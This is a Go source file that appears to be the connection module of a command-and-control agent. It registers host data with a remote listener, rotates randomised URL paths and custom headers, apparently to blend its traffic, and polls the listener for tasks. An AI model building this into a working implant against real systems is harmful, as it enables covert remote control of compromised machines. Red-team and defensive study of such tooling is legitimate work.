package connection

import (
	"bytes"
	"encoding/json"
	"fmt"
	"math/rand"
	"net/http"
	"strconv"
)

type registrationResponse struct {
	AgentID string `json:"agent_id"`
}

type Connection struct {
	remoteHost           string
	remotePort           int
	tasksUrlPaths        []string
	resultsUrlPaths      []string
	registrationUrlPaths []string
	extraHeaders         map[string]string
	listenerBaseUrl      string
	agentID              *string
}

func NewConnection(
	remoteHost string,
	remotePort int,
	tasksUrlPathsJson []string,
	resultsUrlPathsJson []string,
	registrationUrlPathsJson []string,
	extraHeadersJson map[string]string,
) *Connection {
	return &Connection{
		remoteHost:           remoteHost,
		remotePort:           remotePort,
		tasksUrlPaths:        tasksUrlPathsJson,
		resultsUrlPaths:      resultsUrlPathsJson,
		registrationUrlPaths: registrationUrlPathsJson,
		extraHeaders:         extraHeadersJson,
		listenerBaseUrl:      "http://" + remoteHost + ":" + strconv.Itoa(remotePort),
		agentID:              nil,
	}
}

func (c *Connection) RegisterWithListener(agentData map[string]any) (string, error) {
	jsonData, err := json.Marshal(agentData)
	if err != nil {
		return "", err
	}

	randomPath := c.registrationUrlPaths[rand.Intn(len(c.registrationUrlPaths))]
	randomRegisterUrl := c.listenerBaseUrl + randomPath
	req, err := http.NewRequest("POST", randomRegisterUrl, bytes.NewBuffer(jsonData))
	if err != nil {
		return "", err
	}

	req.Header.Set("Content-Type", "application/json")
	for key, value := range c.extraHeaders {
		req.Header.Set(key, value)
	}

	resp, err := http.DefaultClient.Do(req)
	if err != nil {
		return "", err
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		return "", fmt.Errorf("Invalid response: %s", resp.Status)
	}

	registrationResponse := registrationResponse{}
	err = json.NewDecoder(resp.Body).Decode(&registrationResponse)
	if err != nil {
		return "", err
	}

	return registrationResponse.AgentID, nil
}

func (c *Connection) GetTasksFromListener() ([]taskLaunchMessage, error) {
	resp, err := http.Get(c.listenerBaseUrl + c.tasksUrlPaths[rand.Intn(len(c.tasksUrlPaths))])
	if err != nil {
		return []taskLaunchMessage{}, err
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		return []taskLaunchMessage{}, fmt.Errorf("Invalid response: %s", resp.Status)
	}

	var tasks []taskLaunchMessage
	err = json.NewDecoder(resp.Body).Decode(&tasks)
	if err != nil {
		return []taskLaunchMessage{}, err
	}
	return tasks, nil
}
